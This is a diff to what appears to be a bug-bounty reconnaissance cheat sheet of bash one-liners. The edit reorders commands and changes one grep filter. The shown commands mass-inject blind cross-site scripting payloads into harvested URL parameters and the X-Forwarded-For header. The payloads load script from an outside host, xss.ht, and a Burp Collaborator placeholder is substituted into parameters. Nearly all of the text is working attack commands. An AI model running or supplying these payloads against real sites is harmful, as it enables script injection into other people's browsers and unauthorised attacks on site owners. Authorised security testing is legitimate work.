@@ -788,21 +788,22 @@ cat httpx | gau | tee ./gau-1 && cat httpx | gauplus | tee ./gau-2 && cat httpx 
 cat finalwaybackurls | uro | tee ./uro && cat uro | wc -l
 ```
 
-- 8th Command for find reflected param and js file
+- 8th Command for find reflected param & XSS
+```bash
+cat finalwaybackurls | grep "=" | Gxss -c 100 -o gxss -v
+```
 ```bash
 cat finalwaybackurls | grep "=" | qsreplace https://YOUR.burpcollaborator.net | httpx -silent -sc -cl -location -rt
 ```
 > Blind XSS In Parameters
 ```bash
-cat finalwaybackurls | grep "&" | bxss -appendMode -payload '"><script src=https://pr0xh4ck.xss.ht></script>' -parameters
+cat finalwaybackurls | grep "=" | bxss -appendMode -payload '"><script src=https://pr0xh4ck.xss.ht></script>' -parameters
 ```
 > Blind XSS In X-Forwarded-For Header
 ```bash
 cat finalwaybackurls | bxss -payload '"><script src=https://pr0xh4ck.xss.ht></script>' -header "X-Forwarded-For"
 ```
-```bash
-cat finalwaybackurls | grep "=" | Gxss -c 100 -o gxss -v
-```
+
 > separete js file from waybackurls
 ```bash
 cat finalwaybackurls | subjs | sort -u | tee ./subjs
